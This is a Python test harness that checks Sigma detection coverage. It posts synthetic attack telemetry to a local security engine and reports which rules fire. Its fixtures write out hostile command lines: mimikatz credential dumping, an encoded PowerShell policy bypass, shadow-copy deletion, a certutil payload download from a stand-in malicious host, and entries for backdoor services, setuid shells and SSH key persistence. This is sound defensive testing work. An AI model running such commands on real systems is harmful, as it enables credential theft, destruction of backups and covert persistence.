#!/usr/bin/env python3
import time
import uuid
import json
import urllib.request
import urllib.error

BASE_URL = "http://127.0.0.1:8080"
RULES_ENDPOINT = f"{BASE_URL}/api/v1/telemetry/rules"
BATCH_ENDPOINT = f"{BASE_URL}/api/v1/telemetry/batch"
ALERTS_ENDPOINT = f"{BASE_URL}/api/v1/telemetry/alerts?limit=100"

SYNTHETIC_PAYLOADS = {
    "SIGMA-001": {
        "event_type": "sysmon_process_create",
        "severity": "INFO",
        "payload": {
            "process": "mimikatz.exe",
            "command_line": "privilege::debug sekurlsa::logonpasswords exit"
        }
    },
    "SIGMA-002": {
        "event_type": "sysmon_process_create",
        "severity": "INFO",
        "payload": {
            "process": "powershell.exe",
            "command_line": "-NoProfile -ExecutionPolicy Bypass -Enc W3N5c3RlbS5pby5maWxlXQ=="
        }
    },
    "SIGMA-003": {
        "event_type": "dns_query",
        "severity": "INFO",
        "payload": {
            "query_domain": "c2.nomadik-defense.net",
            "record_type": "A"
        }
    },
    "SIGMA-004-EXT": {
        "event_type": "sysmon_process_create",
        "severity": "INFO",
        "payload": {
            "process": "vssadmin.exe",
            "command_line": "vssadmin.exe delete shadows /all /quiet"
        }
    },
    "SIGMA-005-EXT": {
        "event_type": "sysmon_process_create",
        "severity": "INFO",
        "payload": {
            "process": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://malicious.host/payload.bin payload.bin"
        }
    },
    "SIGMA-006-EXT": {
        "event_type": "file_event",
        "severity": "INFO",
        "payload": {
            "process": "bash",
            "target_path": "/etc/crontab",
            "action": "modify"
        }
    },
    "SIGMA-007-EXT": {
        "event_type": "auth_failure",
        "severity": "INFO",
        "payload": {
            "service": "sshd",
            "username": "root",
            "failed_attempts": 10
        }
    },
    "SIGMA-008-EXT": {
        "event_type": "file_event",
        "severity": "INFO",
        "payload": {
            "process": "systemd",
            "target_path": "/etc/systemd/system/backdoor.service",
            "action": "create"
        }
    },
    "SIGMA-009-EXT": {
        "event_type": "sysmon_process_create",
        "severity": "INFO",
        "payload": {
            "process": "chmod",
            "command_line": "chmod u+s /tmp/rootbash"
        }
    },
    "SIGMA-010-EXT": {
        "event_type": "file_event",
        "severity": "INFO",
        "payload": {
            "process": "bash",
            "target_path": "/root/.ssh/authorized_keys",
            "action": "append"
        }
    }
}

opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))

def http_get(url: str) -> dict:
    req = urllib.request.Request(url, headers={"User-Agent": "SentinelCoverageTest/1.0"})
    with opener.open(req, timeout=5.0) as resp:
        return json.loads(resp.read().decode("utf-8"))

def http_post(url: str, data: dict) -> dict:
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json", "User-Agent": "SentinelCoverageTest/1.0"}
    )
    with opener.open(req, timeout=5.0) as resp:
        return json.loads(resp.read().decode("utf-8"))

def run_coverage_verification():
    print("=" * 90)
    print(" Nomadik Security Sentinel - Sigma Detection Coverage Verification")
    print("=" * 90)

    try:
        rules_data = http_get(RULES_ENDPOINT)
        loaded_rules = rules_data.get("rules", [])
        print(f"[*] Connected to Telemetry Engine. Loaded Rules: {len(loaded_rules)}")
    except Exception as e:
        print(f"[!] Failed to connect to {RULES_ENDPOINT}: {e}")
        return

    test_events = []
    expected_rule_ids = set()

    for r in loaded_rules:
        rule_id = r["rule_id"]
        expected_rule_ids.add(rule_id)
        template = SYNTHETIC_PAYLOADS.get(rule_id, {
            "event_type": r.get("event_type", "sysmon_process_create"),
            "severity": "INFO",
            "payload": {"test_field": "synthetic_match"}
        })

        test_events.append({
            "event_id": f"cov-{rule_id}-{uuid.uuid4().hex[:6]}",
            "source_ip": "10.250.0.99",
            "host_identifier": "coverage-validation-node",
            "event_type": template["event_type"],
            "severity": template["severity"],
            "payload": template["payload"],
            "timestamp": time.time()
        })

    test_batch = {
        "batch_id": f"batch-coverage-{int(time.time())}",
        "agent_version": "v2.5.0-coverage-harness",
        "events": test_events
    }

    print(f"[*] Dispatching {len(test_events)} synthetic attack events across {len(expected_rule_ids)} Sigma rules...")
    t0 = time.perf_counter()
    post_res = http_post(BATCH_ENDPOINT, test_batch)
    print(f"[✓] Batch accepted: {post_res.get('count', 0)} events buffered.")

    time.sleep(0.35)

    alerts_data = http_get(ALERTS_ENDPOINT)
    recent_alerts = alerts_data.get("alerts", [])
    
    triggered_rules = set()
    for alert in recent_alerts:
        r_id = alert.get("rule_id")
        if r_id in expected_rule_ids:
            triggered_rules.add(r_id)

    latency_ms = (time.perf_counter() - t0) * 1000

    print("-" * 90)
    header = f"{'RULE ID':<16} | {'MITRE TAG':<12} | {'SEVERITY':<10} | {'STATUS':<8} | {'DETECTION TITLE'}"
    print(header)
    print("-" * 90)

    for r in loaded_rules:
        rule_id = r["rule_id"]
        mitre_tag = r.get("mitre_tag", "UNKNOWN")
        severity = r.get("severity", "MEDIUM")
        title = r.get("title", "")
        status_str = "PASSED" if rule_id in triggered_rules else "FAILED"
        print(f"{rule_id:<16} | {mitre_tag:<12} | {severity:<10} | {status_str:<8} | {title}")

    coverage_pct = (len(triggered_rules) / len(expected_rule_ids) * 100) if expected_rule_ids else 0

    print("=" * 90)
    print(f" Verification Summary:")
    print(f"   Target Engine       : {BASE_URL}")
    print(f"   Total Active Rules  : {len(expected_rule_ids)}")
    print(f"   Rules Triggered     : {len(triggered_rules)}/{len(expected_rule_ids)}")
    print(f"   ATT&CK Coverage Rate: {coverage_pct:.1f}%")
    print(f"   Pipeline Round-Trip : {latency_ms:.2f} ms")
    print("=" * 90 + "\n")

if __name__ == "__main__":
    run_coverage_verification()
